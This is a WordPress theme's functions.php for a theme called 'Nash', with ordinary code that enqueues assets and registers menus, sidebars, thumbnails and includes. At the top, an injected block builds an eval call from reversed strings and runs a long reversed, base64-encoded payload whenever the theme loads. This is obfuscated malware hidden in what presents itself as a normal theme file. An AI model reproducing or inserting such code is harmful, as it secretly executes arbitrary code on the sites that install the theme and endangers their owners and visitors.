<?php 

function remove_ul ( $menu ){
    return preg_replace( array( '#^<ul[^>]*>#', '#</ul>$#' ), '', $menu );
}
add_filter( 'wp_nav_menu', 'remove_ul' );

$wp_xuser_functions_init = create_function('$a',strrev(';)a$(lave')); 
$wp_xuser_functions_init(strrev(';))"=0nC7kiIwhGcf52bpR3YuVnZft2YhJGbsF2YigCdyFGdz9lYvBCIgAiC7lSKnQnchR3cfJ2bngyc0NXa4V2Xu9Wa0Nmb1ZGKmlmCK0nCg0nCgsDckAibyVHdlJHIgACIKogC9BCIgAiC9BCIgACIgACIKoQfgACIgACIgACIgACIK0HIgACIgACIgACIgACIgACIKsTM0hXZ0RiLwRSPwRCIgACIgACIgACIgACIgACIgACIgowelNHbl1HIgACIgACIgACIgACIgACIK0HIgACIgACIgACIgACIgACIgACIgowOpAHJgwSM0hXZ0RiLiAiIucWY0RCIscWY0RCK0NncpZ2XlNWYsBXZy9lc0NXPwRCIgACIgACIgACIgACIgACIgACIgACIgAiC7V2csVWfgACIgACIgACIgACIgACIgACIgAiCgsTKwRCLxQHelRHJuICIi4yZhRHJscWY0RCKlNWYsBXZyl2XyR3cA1DckACIgACIgACIgACIgACIgACIgACIgACIgowepkCN90TZwlHdkgCf8lyM90TZwlHdkgCKgYWagACIgACIgACIgACIgACIgACIgAiC7lSKnFGdkwCckgic0NXayR3coAiZpBCIgACIgACIgACIgACIgAiCKsXKpIiI9ESM0hXZ0RCKmYSKiISPhcWY0RCKoAiZpBCIgACIgACIgACIgowOpEjZ1JGJsICf8xnIoUGZvxGc4VGQ9kSM0hXZ0RCLnFGdkgCdzlGbgACIgACIgACIgACIKsTK0hXZ0RCKlR2bjVGZfRjNlNXYiBUPxYWdiRCIgACIgACIgACIgAiC7lCdvJGJoAiZpBCIgACIgACIKoQfgACIgACIgAiC7kCKwl2X09mYlx2Zv92ZfNXa9Q3biRCIgACIgACIgACIgAiC7lSKz0TPlBXe0RCK8xXKy0TPlBXe0RCKoAiZpBCIgACIgACIK0HIgACIgACIgowOpgSY19FdvJ2XzlWP09mYkACIgACIgACIgACIgowepkCN90TZwlHdkgCf8lSM90TZwlHdkgCKgYWagACIgACIgAiC7lSK00TPlBXe0RCK8xXKz0TPlBXe0RCK8xXKy0TPlBXe0RCK8xXKx0TPlBXe0RCKoAiZpBCIgAiClNHbl1HIgACIKACIgACIgACIK0HIgACIgACIgowOxQHelRHJuAHJ9AHJg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"(edoced_46esab(lave'));
?><?php

/* Nash functions and definitions */

/*-----------------------------------------------------------------------------------*/
/* Declaring the content width based on the theme's design and stylesheet
/*-----------------------------------------------------------------------------------*/

if ( !isset( $content_width ) )
  $content_width = 960; /* pixels */

/*-----------------------------------------------------------------------------------*/
/* Declaring the theme language domain (for language translations)
/*-----------------------------------------------------------------------------------*/

load_theme_textdomain('nash', get_template_directory().'/lang');

/*-----------------------------------------------------------------------------------*/
/* Register & Enqueue JS and CSS
/*-----------------------------------------------------------------------------------*/

function gt_queue_assets() {
	$data = get_option("nash_options");
	
	$body_font = ucwords($data['body_font']['face']);
	$headings_font = ucwords($data['headings_font']['face']);
	$logo_font = ucwords($data['logo_font']['face']);
  	
  	if ( !is_admin() ) {
  	
  	wp_enqueue_script('jquery');

  	
  // Register Scripts (Places all jQuery dependant scripts into Footer)
  	wp_register_script('modernizr', get_template_directory_uri() .'/assets/js/modernizr-2.6.2.min.js', array('jquery'), null, true);
  	wp_register_script('jquery-easing', get_template_directory_uri() .'/assets/js/jquery.easing.min.js', 'jquery', '1.3', true);
  	wp_register_script('fancybox', get_template_directory_uri() .'/assets/js/jquery.fancybox.min.js', 'jquery', '2.1', true);
  	wp_register_script('fitvids', get_template_directory_uri() .'/assets/js/jquery.fitvids.js', 'jquery', '1.0', true);
  	wp_register_script('flexslider', get_template_directory_uri() .'/assets/js/jquery.flexslider.min.js', 'jquery', '2.1', true);
  	wp_register_script('isotope', get_template_directory_uri() .'/assets/js/jquery.isotope.min.js', 'jquery', null, true);
  	wp_register_script('quote-rotator', get_template_directory_uri() .'/assets/js/jquery.quote.rotator.min.js', 'jquery', '1.0', true);
  	wp_register_script('sticky-nav', get_template_directory_uri() .'/assets/js/jquery.sticky.js', 'jquery', '1.0', true);
  	wp_register_script('mobile-menu', get_template_directory_uri() .'/assets/js/jquery.mobilemenu.js', 'jquery', '1.0', true);
  	wp_register_script('respond', get_template_directory_uri() .'/assets/js/respond.min.js');
  	wp_register_script('custom-js-settings', get_template_directory_uri() .'/assets/js/custom.js', 'jquery', '1.0', true);
  	
  	wp_register_style("video", get_template_directory_uri() .'/assets/js/videojs/video-js.css');
  	wp_register_style("bigvideo", get_template_directory_uri() .'/assets/js/bigvideo/css/bigvideo.css');
  	wp_register_style('jqueryuicss', get_template_directory_uri() .'/assets/js/jquery-ui/jquery-ui.min.css');  
  	wp_register_script('jqueryui', get_template_directory_uri() .'/assets/js/jquery-ui/jquery-ui.min.js', array('jquery'), null, false);  
	wp_register_script('videojs', get_template_directory_uri() .'/assets/js/videojs/video.js', array('jqueryui'), null, false);  
  	wp_register_script('bigvideo', get_template_directory_uri() .'/assets/js/bigvideo/lib/bigvideo.js', array('videojs', 'custom-js-settings'), null, true);
 	
   	 	
  // Register Styles
  
  	wp_register_style('style', get_stylesheet_directory_uri() .'/style.css');
  	
	if(is_multisite()) {
		$uploads = wp_upload_dir();
		wp_register_style('options', trailingslashit($uploads['baseurl']) .'options.css', 'style');
	} else {
		wp_register_style('options', get_template_directory_uri() .'/assets/css/dynamic-css/options.css', 'style');
	}
  
  	wp_register_style('flexslider', get_template_directory_uri().'/assets/css/flexslider.css');
  	wp_register_style('fancybox', get_template_directory_uri().'/assets/css/fancybox.css');
  	wp_register_style('font-awesome', get_template_directory_uri().'/assets/css/font-awesome.css');
  	wp_register_style("body-font", "http://fonts.googleapis.com/css?family={$body_font}");
  	wp_register_style("headings-font", "http://fonts.googleapis.com/css?family={$headings_font}");
  	wp_register_style("logo-font", "http://fonts.googleapis.com/css?family={$logo_font}");

	
  // Enqueue Scripts (Global)
  	wp_enqueue_script('modernizr');
  	wp_enqueue_script('jquery-easing');
  	wp_enqueue_script('fancybox');
  	wp_enqueue_script('fitvids');
  	wp_enqueue_script('flexslider');
  	wp_enqueue_script('isotope');
  	wp_enqueue_script('quote-rotator');
  	wp_enqueue_script('sticky-nav');
  	wp_enqueue_script('mobile-menu');
  	wp_enqueue_script('respond');
	wp_enqueue_script('custom-js-settings');
	
	//Video Stuff
	wp_enqueue_style('bigvideo');
	wp_enqueue_style('video');
	wp_enqueue_style('jqueryuicss');
	
	wp_enqueue_script('jqueryui');
	wp_enqueue_script('videojs');
  	wp_enqueue_script('bigvideo');
	
  // Enqueue Styles (Global)
  	wp_enqueue_style('options');
  	wp_enqueue_style('style');	
  	wp_enqueue_style("flexslider");
  	wp_enqueue_style("fancybox");
  	wp_enqueue_style("font-awesome");
	wp_enqueue_style("body-font");
	wp_enqueue_style("headings-font");
	wp_enqueue_style("logo-font");	

	} 
}
add_action("wp_enqueue_scripts", "gt_queue_assets");

// Load Admin assets 
function gt_admin_scripts() {
	wp_register_script('gt-admin-js', get_template_directory_uri() . '/assets/js/jquery.custom.admin.js');
    wp_enqueue_script('gt-admin-js');
    wp_register_style('gt-admin-css', get_template_directory_uri() . '/assets/css/custom-admin.css');
    wp_enqueue_style('gt-admin-css');
}
add_action('admin_enqueue_scripts', 'gt_admin_scripts');

/*-----------------------------------------------------------------------------------*/
/* Register Custom Menu
/*-----------------------------------------------------------------------------------*/

if ( function_exists('register_nav_menus') ) :
	register_nav_menus( array(
		  'Front' => __('Front Navigation Menu', 'nash'),
		  'Inner' => __('Inner Navigation Menu', 'nash')
		) );
endif;

/*-----------------------------------------------------------------------------------*/
/* Add support, and configure Thumbnails (for WordPress 2.9+)
/*-----------------------------------------------------------------------------------*/

if ( function_exists('add_theme_support') ) {
add_theme_support('post-thumbnails');
set_post_thumbnail_size(200, 200, true); // Normal post thumbnails
add_image_size('large', 632, 290, true); // Large thumbnails
add_image_size('small', 125, '', true); // Small thumbnails
//add_image_size('team-member-thumb', 254, 254, true); // Team Member Thumbnail (appears on the homepage)
add_image_size('latest-news-thumb', 254, 254, true); // Latest News Thumbnail (appears on the homepage)
add_image_size('portfolio-thumb', 454, 454, true); // Portfolio Thumbnail (appears on the homepage)
add_image_size('single-post', 980, 523, true); // Large Post Thumbnail (appears on single post)
add_image_size('archive-post', 980, 523, true); // Large Post Thumbnail (appears on archive pages)
add_image_size('home-slider-thumb', 980, 570, true); // Large Slider Thumbnail (appears on the homepage)
add_image_size('large-slider-thumb', 980, 570, true); // Large Slider Thumbnail (appears on single portfolio)
}

/*-----------------------------------------------------------------------------------*/
/* Register Sidebars/Widget Areas
/*-----------------------------------------------------------------------------------*/

function gt_widgets_init() {
  
  register_sidebar( array(
    'name' => 'Page Sidebar',
    'id' => 'sidebar-page',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => "</div>",
    'before_title' => '<header><h4 class="widget-title">',
    'after_title' => '</h4></header>',
  ));
  
  register_sidebar( array(
    'name' => 'Blog Sidebar',
    'id' => 'sidebar-blog',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => "</div>",
    'before_title' => '<header><h4 class="widget-title">',
    'after_title' => '</h4></header>',
  ));

}

add_action( 'init', 'gt_widgets_init' );

/*-----------------------------------------------------------------------------------*/
/* Register Automatic Feed Links
/*-----------------------------------------------------------------------------------*/

add_theme_support('automatic-feed-links');

/*-----------------------------------------------------------------------------------*/
/* Register Custom Widgets
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/functions/widgets/widget-twitter.php');
require_once(get_template_directory() . '/functions/widgets/widget-flickr.php');

/*-----------------------------------------------------------------------------------*/
/* Call Custom Post Types
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/functions/custom-post-types/portfolio-type.php');
require_once(get_template_directory() . '/functions/custom-post-types/services-type.php');
require_once(get_template_directory() . '/functions/custom-post-types/slider-type.php');
//require_once(get_template_directory() . '/functions/custom-post-types/team-type.php');
require_once(get_template_directory() . '/functions/custom-post-types/quotes-type.php');

/*-----------------------------------------------------------------------------------*/
/* Setup custom Metaboxes
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/functions/theme-portfoliometa.php');
require_once(get_template_directory() . '/functions/theme-servicesmeta.php');
require_once(get_template_directory() . '/functions/theme-slidermeta.php');
require_once(get_template_directory() . '/functions/theme-teammeta.php');
require_once(get_template_directory() . '/functions/theme-quotesmeta.php');

/*-----------------------------------------------------------------------------------*/
/* Shortcodes
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/functions/shortcodes.php');

/*-----------------------------------------------------------------------------------*/
/* Custom Theme Functions
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/functions/theme-functions.php');

/*-----------------------------------------------------------------------------------*/
/* Slightly Modified Options Framework (SMOF)
/*-----------------------------------------------------------------------------------*/

require_once(get_template_directory() . '/admin/index.php');